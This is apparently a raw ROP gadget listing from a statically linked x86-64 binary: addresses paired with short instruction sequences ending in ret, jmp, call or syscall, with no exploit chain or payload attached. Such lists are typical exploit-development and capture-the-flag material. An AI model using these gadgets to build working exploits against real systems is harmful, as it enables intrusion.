0x00000000004b1737 : add ah, bl ; pop rbp ; add byte ptr [rax], al ; push rsp ; jns 0x4b1741 ; jmp rax
0x00000000004a9007 : add ah, byte ptr [rbp + rdi - 0x55] ; retf 0xa2fe
0x00000000004476ca : add ah, byte ptr [rdx - 0xf] ; jl 0x44771f ; adc dword ptr [rsi + 3], edx ; ret
0x00000000004b2b42 : add ah, byte ptr [rsi + rcx + 8] ; ret
0x00000000004af847 : add ah, ch ; add byte ptr ds:[rax], al ; adc al, 0x9c ; clc ; jmp qword ptr [rsi]
0x00000000004afc43 : add ah, ch ; mov cl, bh ; jmp rbx
0x00000000004afbf3 : add ah, cl ; mov cl, bh ; call qword ptr [rdx]
0x00000000004b1e4f : add ah, dh ; add byte ptr fs:[rax], al ; jl 0x4b1e3c ; cli ; call qword ptr [rsi]
0x00000000004afb7b : add ah, dh ; jg 0x4afb7c ; call rsp
0x0000000000400a59 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x00000000004abe7b : add ah, dl ; xchg eax, edx ; cmc ; call rsp
0x0000000000453ab3 : add al, 0 ; add bh, dh ; ret 0
0x0000000000453aa7 : add al, 0 ; add bh, dh ; ret 0xf800
0x00000000004577af : add al, 0 ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x0000000000411a40 : add al, 0 ; add byte ptr [rax + 1], cl ; ret
0x000000000048c29d : add al, 0 ; add byte ptr [rax - 0x7bf0df06], al ; retf 4
0x000000000042b577 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000046f3f6 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x000000000044051f : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b5a5 : add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000048e1b0 : add al, 0 ; add byte ptr [rax], al ; jne 0x48e1d7 ; ret
0x00000000004749d3 : add al, 0 ; add byte ptr [rax], al ; ret
0x0000000000449eef : add al, 0 ; add byte ptr [rax], al ; syscall
0x0000000000428e38 : add al, 0 ; add byte ptr [rbp - 0x77], cl ; retf
0x00000000004726f0 : add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000040a101 : add al, 0 ; add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x000000000040ad04 : add al, 0 ; add byte ptr [rbx - 0x7bf0fc08], al ; ret
0x0000000000409fc0 : add al, 0 ; add byte ptr [rbx - 0x7bf0fe08], al ; ret 4
0x0000000000424d15 : add al, 0 ; add byte ptr [rsi - 9], dh ; ret 0
0x000000000044c992 : add al, 0 ; mov eax, 0x15 ; syscall
0x0000000000449b71 : add al, 0 ; movsxd rax, dword ptr [rdx + rbx*4] ; add rax, rdx ; jmp rax
0x00000000004489c5 : add al, 0 ; movsxd rax, dword ptr [rsi + rdi*4] ; add rax, rsi ; jmp rax
0x0000000000475b4b : add al, 0x11 ; ret
0x0000000000448ab4 : add al, 0x12 ; pop rbx ; and eax, 0x7ff80000 ; ret
0x00000000004265a1 : add al, 0x17 ; movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x000000000042653a : add al, 0x17 ; sub eax, ecx ; ret
0x0000000000486dc0 : add al, 0x24 ; add rax, qword ptr [rdx + 8] ; call rax
0x000000000048adf7 : add al, 0x24 ; add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000048aafb : add al, 0x24 ; add rsp, 0x38 ; ret
0x0000000000489cf4 : add al, 0x24 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x000000000045b48a : add al, 0x25 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004843cb : add al, 0x25 ; sub byte ptr [rax], al ; add byte ptr [rax], al ; jne 0x484417 ; leave ; ret
0x000000000040ea87 : add al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x000000000047351e : add al, 0x31 ; ret
0x000000000047341a : add al, 0x37 ; ret
0x000000000041830f : add al, 0x3a ; ret
0x00000000004a70e6 : add al, 0x3d ; retf
0x000000000047fa86 : add al, 0x48 ; cmp ecx, dword ptr [rdi + rsi] ; jae 0x47fa3a ; xor eax, eax ; ret
0x00000000004450db : add al, 0x48 ; lea eax, [rdi + 5] ; ret
0x00000000004445e9 : add al, 0x48 ; lea eax, [rdx + 4] ; ret
0x00000000004445fb : add al, 0x48 ; lea eax, [rdx + 5] ; ret
0x000000000048d300 : add al, 0x48 ; mov dword ptr [rax], edx ; ret
0x0000000000435cea : add al, 0x48 ; mov dword ptr [rdi], ecx ; ret
0x0000000000442e29 : add al, 0x48 ; mov eax, edi ; ret
0x00000000004737f4 : add al, 0x48 ; xor eax, eax ; ret
0x000000000047e816 : add al, 0x4c ; cmp ecx, eax ; jne 0x47e7c4 ; mov eax, dword ptr [rdx + 4] ; ret
0x00000000004740b8 : add al, 0x4c ; lea ecx, [rsp + 0x20] ; call rbx
0x0000000000456dea : add al, 0x4d ; cmp ebp, ebx ; jb 0x456e60 ; mov rdx, rax ; jmp 0x456db7
0x00000000004445f7 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; lea rax, [rdx + 5] ; ret
0x0000000000442e37 : add al, 0x66 ; mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x0000000000458172 : add al, 0x72 ; adc ecx, dword ptr [rcx + 0x29d231fb] ; ret
0x0000000000454439 : add al, 0x74 ; and eax, 0x833fe283 ; retf 0x4180
0x000000000047d88a : add al, 0x75 ; retf
0x000000000046ebd8 : add al, 0x81 ; add rax, rcx ; jmp rax
0x000000000043da5b : add al, 0x81 ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x000000000043f333 : add al, 0x81 ; sub eax, edx ; ret
0x0000000000402037 : add al, 0x82 ; add rax, rdx ; jmp rax
0x0000000000448ff8 : add al, 0x82 ; sub eax, dword ptr [rdx + rcx*4] ; je 0x448fe8 ; ret
0x000000000043b667 : add al, 0x82 ; sub eax, ecx ; ret
0x000000000044ddd9 : add al, 0x83 ; add rax, rbx ; jmp rax
0x000000000048c19a : add al, 0x84 ; add rax, r12 ; jmp rax
0x0000000000466cf9 : add al, 0x84 ; ror byte ptr [rdi], 0x84 ; ret 0x17
0x00000000004744a9 : add al, 0x85 ; sal byte ptr [rbp - 0xe], cl ; ret
0x000000000048ca9b : add al, 0x86 ; add rax, r14 ; jmp rax
0x000000000046ea6c : add al, 0x86 ; add rax, rsi ; jmp rax
0x000000000048b149 : add al, 0x87 ; add rax, r15 ; jmp rax
0x000000000046f208 : add al, 0x87 ; add rax, rdi ; jmp rax
0x00000000004445e6 : add al, 0x88 ; add al, 0x48 ; lea eax, [rdx + 4] ; ret
0x0000000000442e26 : add al, 0x88 ; add al, 0x48 ; mov eax, edi ; ret
0x000000000048af23 : add al, 0x88 ; add rax, r8 ; jmp rax
0x0000000000458856 : add al, 0x89 ; retf
0x0000000000488139 : add al, 0x89 ; retf 0xeac0
0x0000000000448ffb : add al, 0x8a ; je 0x448fe5 ; ret
0x0000000000448a83 : add al, 0x96 ; add rax, rsi ; jmp rax
0x000000000048c6d3 : add al, 0x99 ; add rax, r9 ; jmp rax
0x0000000000449b75 : add al, 0x9a ; add rax, rdx ; jmp rax
0x000000000047c22f : add al, 0xa1 ; add rax, rcx ; jmp rax
0x000000000047cb57 : add al, 0xa7 ; add rax, rdi ; jmp rax
0x0000000000417997 : add al, 0xa8 ; add dword ptr [rsp - 0x7d], esi ; retf 0x4c01
0x00000000004489c9 : add al, 0xbe ; add rax, rsi ; jmp rax
0x000000000046bdd0 : add al, 0xc6 ; jmp rax
0x0000000000460f6a : add al, 0xc6 ; mov esi, 1 ; jmp rax
0x00000000004615ca : add al, 0xc6 ; xor esi, esi ; jmp rax
0x0000000000460f20 : add al, 0xc7 ; jmp rax
0x000000000046be0b : add al, 0xc8 ; mov ecx, 1 ; jmp rax
0x000000000048450d : add al, 0xde ; lea r9, [rdx] ; jmp 0x484569
0x000000000048830d : add al, 0xde ; lea r9, [rdx] ; jmp 0x488369
0x0000000000459a61 : add al, 0xe8 ; test rax, rax ; je 0x459a71 ; call rax
0x0000000000455740 : add al, 0xe9 ; cmp eax, 0x89fffff3 ; retf 0xe283
0x0000000000465a2d : add al, 0xe9 ; retf 0xfffb
0x000000000045717c : add al, 0xf ; mov dh, 0x40 ; add ecx, dword ptr [rax + 0x39] ; retf
0x0000000000484db8 : add al, 0xf ; mov dh, 0xc0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042ab86 : add al, 0xf ; movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x0000000000404a8a : add al, 0xf ; retf
0x00000000004474db : add al, 0xf ; sub rax, rsi ; ret
0x0000000000436053 : add al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000044a1eb : add al, 0xf3 ; ret
0x00000000004ae781 : add al, 0xf7 ; jmp rsi
0x00000000004609de : add al, 0xf8 ; jmp rax
0x00000000004b0f59 : add al, 0xfa ; call qword ptr [rax]
0x00000000004b4ac1 : add al, 0xfd ; jmp qword ptr [rdx]
0x00000000004b4ad9 : add al, 0xfd ; jmp rdx
0x000000000040f0d7 : add al, 1 ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000042de27 : add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000440a4d : add al, 7 ; cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x000000000046bdcc : add al, 7 ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000440c68 : add al, 7 ; ret
0x000000000042670f : add al, 8 ; movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x00000000004b0fdc : add al, 9 ; cli ; jmp qword ptr [rdx]
0x00000000004af8af : add al, ah ; cli ; clc ; call qword ptr [rax]
0x0000000000494744 : add al, ah ; stc ; call rax
0x00000000004ae77f : add al, al ; add al, 0xf7 ; jmp rsi
0x00000000004b1d1f : add al, al ; mov ch, 0xfa ; call qword ptr [rbx]
0x00000000004b1d1b : add al, al ; movsxd rax, dword ptr [rax] ; add al, al ; mov ch, 0xfa ; call qword ptr [rbx]
0x000000000049f467 : add al, al ; sldt word ptr [rax] ; ret
0x0000000000495378 : add al, bh ; cli ; call qword ptr [rax]
0x00000000004b2df7 : add al, bh ; cli ; sti ; jmp qword ptr [rbx]
0x00000000004abf07 : add al, bh ; cwde ; cmc ; call rax
0x0000000000448b15 : add al, bh ; jg 0x448b17 ; int1 ; mov eax, eax ; ret
0x00000000004b0f53 : add al, bh ; push rbp ; add byte ptr [rax], al ; call 0x114b0969
0x00000000004b5f33 : add al, bl ; movsd dword ptr [rdi], dword ptr [rsi] ; add byte ptr [rax], al ; test al, 0x9f ; std ; jmp qword ptr [rax]
0x00000000004b1233 : add al, bl ; pop rax ; add byte ptr [rax], al ; test al, 0x25 ; cli ; call qword ptr [rdi]
0x000000000040d822 : add al, byte ptr [eax] ; add byte ptr [rax - 0x7d], cl ; retf 0x4809
0x0000000000441641 : add al, byte ptr [rax + rax*8 - 0xb7ed8c] ; ret 0x2288
0x000000000048780e : add al, byte ptr [rax] ; add al, ch ; retf 0xf7a3
0x000000000045730e : add al, byte ptr [rax] ; add al, ch ; retf 0xfaa8
0x00000000004550a3 : add al, byte ptr [rax] ; add al, ch ; xor eax, 0x89fffacb ; retf 0xe283
0x000000000040111b : add al, byte ptr [rax] ; add bh, bh ; push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x0000000000455e7a : add al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; retf 0x8341
0x0000000000455aad : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000047b090 : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0xed75
0x000000000041e82d : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; retf 0x820f
0x000000000045f863 : add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x000000000042ba82 : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x00000000004881ee : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret 0x3a83
0x000000000045b51d : add al, byte ptr [rax] ; add byte ptr [rax + rcx*2 - 0x77], ah ; adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x0000000000401105 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x0000000000468bc4 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x0000000000423cc3 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x000000000047c40a : add al, byte ptr [rax] ; add byte ptr [rax - 0x75], cl ; adc byte ptr [r8 - 0x7d], cl ; ret
0x0000000000478545 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x000000000046ffcd : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; retf
0x0000000000448004 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000421fca : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000045524b : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000042b757 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f0f1 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000042b785 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000040d823 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; retf 0x4809
0x000000000045b412 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7f], cl ; ret 0x200
0x000000000047dd06 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000044afc9 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp rax
0x000000000040dcac : add al, byte ptr [rax] ; add byte ptr [rax], al ; mov eax, 0xe ; syscall
0x0000000000474764 : add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x000000000048587c : add al, byte ptr [rax] ; add byte ptr [rbp + rcx*4 + 4], cl ; retf 0x8b41
0x0000000000487d7a : add al, byte ptr [rax] ; add byte ptr [rbp + rcx*4 + 4], cl ; retf 0xba
0x0000000000428fb8 : add al, byte ptr [rax] ; add byte ptr [rbp - 0x77], cl ; retf
0x0000000000446a84 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x00000000004114a6 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0fd08], al ; ret
0x0000000000485af4 : add al, byte ptr [rax] ; add byte ptr [rcx + 0xc8b48d8], cl ; ret 0xb60f
0x000000000046cba4 : add al, byte ptr [rax] ; add byte ptr [rcx - 0x7d], al ; retf 0xe9ff
0x000000000044b1d0 : add al, byte ptr [rax] ; add byte ptr [rcx - 0x7d], cl ; retf
0x000000000041b696 : add al, byte ptr [rax] ; add dh, dh ; ret
0x0000000000424cc3 : add al, byte ptr [rax] ; cmove rax, rdx ; ret
0x00000000004240ac : add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x000000000047d8e5 : add al, byte ptr [rax] ; mov eax, 0x15 ; syscall
0x000000000048aef2 : add al, byte ptr [rax] ; movss dword ptr [rsp - 0x28], xmm0 ; ret
0x000000000047c22b : add al, byte ptr [rax] ; movsxd rax, dword ptr [rcx + r12*4] ; add rax, rcx ; jmp rax
0x000000000047cb53 : add al, byte ptr [rax] ; movsxd rax, dword ptr [rdi + r12*4] ; add rax, rdi ; jmp rax
0x0000000000484f3a : add al, byte ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000044dd1a : add al, byte ptr [rax] ; xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x44dd0e
0x000000000044b8a5 : add al, byte ptr [rbx + 0x94801e0] ; ret 0x8949
0x000000000044c6ee : add al, byte ptr [rcx + 0x39] ; ret
0x00000000004ac235 : add al, byte ptr [rdx] ; ret 0xb00e
0x0000000000425091 : add al, byte ptr cs:[rax] ; cmovne rax, rdx ; ret
0x0000000000424e7d : add al, byte ptr ss:[rax] ; cmovne rax, rdx ; ret
0x00000000004b0f57 : add al, ch ; add al, 0xfa ; call qword ptr [rax]
0x0000000000452de9 : add al, ch ; int1 ; in eax, dx ; cli ; inc dword ptr [rcx - 0x77] ; ret
0x00000000004138bf : add al, ch ; jmp 0x4138c2
0x0000000000449b3e : add al, ch ; lodsb al, byte ptr [rsi] ; push rbx ; cld ; dec dword ptr [rax - 0x77] ; ret 0x8b48
0x0000000000400bc9 : add al, ch ; loope 0x400bc8 ; add byte ptr [rax], al ; nop ; leave ; ret
0x00000000004560d1 : add al, ch ; or dword ptr [rbx - 0x76be0006], edi ; ret 0x5be9
0x0000000000450364 : add al, ch ; push rsi ; ret
0x0000000000451317 : add al, ch ; ret
0x0000000000422df8 : add al, ch ; ret 0x298
0x0000000000485e38 : add al, ch ; ret 0xb7a1
0x0000000000475c58 : add al, ch ; ret 0xf992
0x0000000000462c18 : add al, ch ; ret 0xf9ef
0x000000000044e178 : add al, ch ; ret 0xfde1
0x0000000000403b2f : add al, ch ; retf
0x0000000000402730 : add al, ch ; retf 0xbfd8
0x0000000000487810 : add al, ch ; retf 0xf7a3
0x0000000000457310 : add al, ch ; retf 0xfaa8
0x0000000000400b57 : add al, ch ; rol dword ptr [rax], cl ; add dword ptr [rax], eax ; nop ; pop rbp ; ret
0x00000000004557bd : add al, ch ; sbb eax, 0x89fffac4 ; retf 0xe283
0x0000000000403401 : add al, ch ; stc ; retf
0x00000000004239ad : add al, ch ; std ; ret
0x00000000004550a5 : add al, ch ; xor eax, 0x89fffacb ; retf 0xe283
0x00000000004afc57 : add al, cl ; mov ecx, edi ; call qword ptr [rdx]
0x00000000004b0917 : add al, cl ; retf 0xfff9
0x00000000004abe67 : add al, cl ; xchg eax, edx ; cmc ; call qword ptr [rdx]
0x00000000004afc2f : add al, dh ; mov cl, bh ; call qword ptr [rax]
0x00000000004afc7f : add al, dh ; mov ecx, edi ; call qword ptr [rbx]
0x00000000004b545f : add al, dh ; push rdi ; std ; call qword ptr [rdx]
0x00000000004b000f : add al, dl ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b414e : add bh, ah ; ret
0x000000000044f15f : add bh, al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000045ebb7 : add bh, al ; test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x000000000040eb7f : add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x000000000049541c : add bh, bh ; cli ; jmp qword ptr [rax]
0x000000000040111d : add bh, bh ; push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x00000000004859bf : add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x0000000000484649 : add bh, byte ptr [rax + 1] ; ret
0x00000000004847a6 : add bh, byte ptr [rax + 2] ; ret
0x0000000000449f0b : add bh, byte ptr [rax - 1] ; ret
0x0000000000446e52 : add bh, byte ptr [rcx] ; enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x0000000000494ddc : add bh, byte ptr [rip + 0x3c92fffa] ; cli ; jmp qword ptr [rdx]
0x000000000047f4ac : add bh, cl ; and eax, dword ptr [rax] ; ret
0x0000000000400eea : add bh, dh ; ret 0
0x0000000000453aa9 : add bh, dh ; ret 0xf800
0x000000000040f237 : add bh, dh ; ret 0xffef
0x0000000000494cfd : add bh, dl ; dec dword ptr [rsi + 0x39] ; cli ; call rax
0x00000000004946a8 : add bl, ah ; stc ; jmp rax
0x0000000000474761 : add bl, al ; mov eax, 2 ; ret
0x000000000048820a : add bl, al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x0000000000463749 : add bl, bl ; sub bl, cl ; in eax, 0xdf ; loopne 0x4636e2 ; ret
0x0000000000460f1a : add bl, byte ptr [rax + 0x25] ; add byte ptr [rax - 0x75], cl ; add al, 0xc7 ; jmp rax
0x000000000048a11b : add bl, ch ; add eax, 0x1489066 ; ret 0xb70f
0x0000000000485c89 : add bl, ch ; ret
0x000000000040f510 : add bl, ch ; ret 0x1f0f
0x000000000048aef3 : add bl, dh ; movups xmmword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000400a5f : add bl, dh ; ret
0x000000000041b98e : add bl, sil ; ret
0x000000000044b213 : add byte ptr [r11 + 0x94801e1], r8b ; retf 0x8949
0x0000000000455ca3 : add byte ptr [r15], r9b ; mov dh, 0x78 ; add cl, byte ptr [rax + 0x39] ; retf
0x0000000000455c8e : add byte ptr [r15], r9b ; mov dh, 0x78 ; add dword ptr [rax + 0x39], ecx ; retf
0x0000000000455cb8 : add byte ptr [r15], r9b ; mov dh, 0x78 ; add ecx, dword ptr [rax + 0x39] ; retf
0x0000000000482905 : add byte ptr [r8 + 0x39], r9b ; retf
0x00000000004816a0 : add byte ptr [r8 + 9], r9b ; ret 0x840f
0x0000000000472996 : add byte ptr [r8 - 0x77], r9b ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000455c55 : add byte ptr [r8 - 0x77], r9b ; fimul dword ptr [rax + 0x29] ; ret 0x8348
0x000000000040e27a : add byte ptr [r8 - 0x7d], r9b ; ret
0x00000000004b00ad : add byte ptr [r8], r8b ; mov al, 0x9d ; stc ; jmp qword ptr [rcx]
0x00000000004758ab : add byte ptr [r9 + rbp - 0x48], sil ; add dword ptr [rcx], eax ; add byte ptr [rax], al ; syscall
0x00000000004b2e0b : add byte ptr [rax + 0x10000074], dh ; sti ; sti ; jmp qword ptr [rbx]
0x00000000004941ff : add byte ptr [rax + 0x10], dl ; stc ; call qword ptr [rax - 0x2f0006ef]
0x000000000044c993 : add byte ptr [rax + 0x15], bh ; syscall
0x0000000000423dbf : add byte ptr [rax + 0x16], bh ; ret
0x0000000000449e5f : add byte ptr [rax + 0x18], bh ; syscall
0x0000000000449e5e : add byte ptr [rax + 0x18], dil ; syscall
0x000000000044af4f : add byte ptr [rax + 0x1c], bh ; syscall
0x00000000004b2feb : add byte ptr [rax + 0x20000076], dl ; or bh, ah ; jmp qword ptr [rax]
0x00000000004498df : add byte ptr [rax + 0x25], bh ; syscall
0x00000000004886af : add byte ptr [rax + 0x26], bh ; syscall
0x0000000000412ac0 : add byte ptr [rax + 0x29], cl ; ret
0x0000000000453231 : add byte ptr [rax + 0x29], cl ; ret 0x349
0x0000000000453d97 : add byte ptr [rax + 0x29], cl ; ret 0x8348
0x0000000000465f08 : add byte ptr [rax + 0x29], cl ; ret 0x8349
0x000000000047aa1a : add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x00000000004229f4 : add byte ptr [rax + 0x29], cl ; retf
0x0000000000455e7c : add byte ptr [rax + 0x29], cl ; retf 0x8341
0x00000000004652b9 : add byte ptr [rax + 0x29], cl ; retf 0x8948
0x000000000047e9c0 : add byte ptr [rax + 0x29], cl ; retf 0x8d48
0x0000000000423f40 : add byte ptr [rax + 0x31], dl ; shr al, 0x57 ; ret
0x00000000004b3403 : add byte ptr [rax + 0x3800007a], ch ; and bh, ah ; jmp qword ptr [rcx]
0x000000000040eb5f : add byte ptr [rax + 0x39], cl ; ret
0x000000000048b0f3 : add byte ptr [rax + 0x39], cl ; ret 0x830f
0x000000000041a99f : add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000413a9f : add byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000048b188 : add byte ptr [rax + 0x39], cl ; ret 0x9272
0x000000000047b092 : add byte ptr [rax + 0x39], cl ; ret 0xed75
0x000000000041d860 : add byte ptr [rax + 0x39], cl ; ret 0xf275
0x00000000004783ee : add byte ptr [rax + 0x39], cl ; ret 0xf48
0x0000000000482906 : add byte ptr [rax + 0x39], cl ; retf
0x000000000042e6c6 : add byte ptr [rax + 0x39], cl ; retf 0x280f
0x0000000000434fbf : add byte ptr [rax + 0x39], cl ; retf 0x377
0x000000000041e82f : add byte ptr [rax + 0x39], cl ; retf 0x820f
0x00000000004111dd : add byte ptr [rax + 0x39], cl ; retf 0x830f
0x00000000004475f8 : add byte ptr [rax + 0x39], cl ; retf 0x870f
0x000000000042e1e6 : add byte ptr [rax + 0x39], cl ; retf 0x8949
0x0000000000448903 : add byte ptr [rax + 0x39], cl ; retf 0xd975
0x0000000000448740 : add byte ptr [rax + 0x39], cl ; retf 0xe175
0x0000000000485a58 : add byte ptr [rax + 0x39], cl ; retf 0xe275
0x00000000004af4cb : add byte ptr [rax + 0x3b], dh ; add byte ptr [rax], al ; add byte ptr [rax - 9], bl ; jmp qword ptr [rbx]
0x00000000004af8ab : add byte ptr [rax + 0x3f], dl ; add byte ptr [rax], al ; loopne 0x4af8b4 ; clc ; call qword ptr [rax]
0x00000000004ab3a5 : add byte ptr [rax + 0x40], al ; mov bl, bh ; std ; jmp rax
0x00000000004af9c3 : add byte ptr [rax + 0x40], ch ; add byte ptr [rax], al ; cmp byte ptr [rbp - 7], cl ; jmp qword ptr [rbx]
0x00000000004b00ab : add byte ptr [rax + 0x47], dl ; add byte ptr [rax], al ; mov al, 0x9d ; stc ; jmp qword ptr [rcx]
0x00000000004b1bf3 : add byte ptr [rax + 0x48000062], bl ; std ; call rdx
0x000000000044a396 : add byte ptr [rax + 0x48], bh ; syscall
0x00000000004b03c3 : add byte ptr [rax + 0x4a], ch ; add byte ptr [rax], al ; pop rax ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x00000000004b03ab : add byte ptr [rax + 0x4a], dl ; add byte ptr [rax], al ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x00000000004b07c3 : add byte ptr [rax + 0x4e], ch ; add byte ptr [rax], al ; call 0x134b0194
0x00000000004b41fb : add byte ptr [rax + 0x60000088], ah ; leave ; cld ; jmp qword ptr [rcx]
0x000000000040d34d : add byte ptr [rax + 0x63], cl ; adc al, 0x97 ; add rdx, rdi ; jmp rdx
0x000000000046ebd5 : add byte ptr [rax + 0x63], cl ; add al, 0x81 ; add rax, rcx ; jmp rax
0x0000000000402034 : add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rax, rdx ; jmp rax
0x000000000046f205 : add byte ptr [rax + 0x63], cl ; add al, 0x87 ; add rax, rdi ; jmp rax
0x0000000000449b72 : add byte ptr [rax + 0x63], cl ; add al, 0x9a ; add rax, rdx ; jmp rax
0x00000000004489c6 : add byte ptr [rax + 0x63], cl ; add al, 0xbe ; add rax, rsi ; jmp rax
0x0000000000459fb7 : add byte ptr [rax + 0x63], cl ; ret
0x000000000048cbc3 : add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004688b5 : add byte ptr [rax + 0x63], cl ; retf 0x8948
0x0000000000471cff : add byte ptr [rax + 0x63], cl ; retf 0x8d4c
0x000000000046f6d3 : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x000000000045dce1 : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x000000000047566f : add byte ptr [rax + 0x66], bh ; syscall
0x000000000047568f : add byte ptr [rax + 0x68], bh ; syscall
0x000000000047567f : add byte ptr [rax + 0x6b], bh ; syscall
0x000000000047569f : add byte ptr [rax + 0x6c], bh ; syscall
0x00000000004b03db : add byte ptr [rax + 0x7000004a], al ; stosd dword ptr [rdi], eax ; stc ; jmp qword ptr [rcx]
0x0000000000489933 : add byte ptr [rax + 0x74], ah ; adc dword ptr [rcx - 0x7d], ecx ; ret
0x000000000044163f : add byte ptr [rax + 0x74c08402], cl ; adc cl, byte ptr [rax - 1] ; ret 0x2288
0x00000000004967b7 : add byte ptr [rax + 0x76], ch ; sti ; lcall [rsi] ; jns 0x4967c2 ; jmp rsi
0x00000000004b2fa3 : add byte ptr [rax + 0x76], cl ; add byte ptr [rax], al ; mov byte ptr [rbx], al ; cld ; jmp rdx
0x000000000044507f : add byte ptr [rax + 0x78d4837], cl ; ret
0x000000000044af1f : add byte ptr [rax + 0xa], bh ; syscall
0x000000000044aeef : add byte ptr [rax + 0xb], bh ; syscall
0x000000000047b6b9 : add byte ptr [rax + 0xca], bh ; syscall
0x0000000000449bd4 : add byte ptr [rax + 0xe5], bh ; syscall
0x000000000040dcaf : add byte ptr [rax + 0xe], bh ; syscall
0x00000000004b0c13 : add byte ptr [rax + 0xf000052], bh ; stc ; hlt ; jmp qword ptr [rbx]
0x0000000000424fe9 : add byte ptr [rax + 0xf4802e5], al ; ret 0xc3f3
0x0000000000448a97 : add byte ptr [rax + 0xf48f0e5], al ; ret 0xc35b
0x0000000000415e1f : add byte ptr [rax + 0xf], al ; mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000473385 : add byte ptr [rax + 0xf], cl ; mov ebp, 0xf80148c0 ; ret
0x000000000041d4db : add byte ptr [rax + 0xf], cl ; mov esi, 0x53b48c0 ; pop rcx ; ret
0x000000000045052f : add byte ptr [rax + 0xf], cl ; mov esi, 0x83480147 ; ret
0x000000000041d614 : add byte ptr [rax + 0xf], cl ; ret
0x000000000047b226 : add byte ptr [rax + 0xf], cl ; ret 0x3e80
0x0000000000424134 : add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004137ca : add byte ptr [rax + 0xf], cl ; ret 0x8948
0x000000000041e6c3 : add byte ptr [rax + 0xf], cl ; ret 0x894c
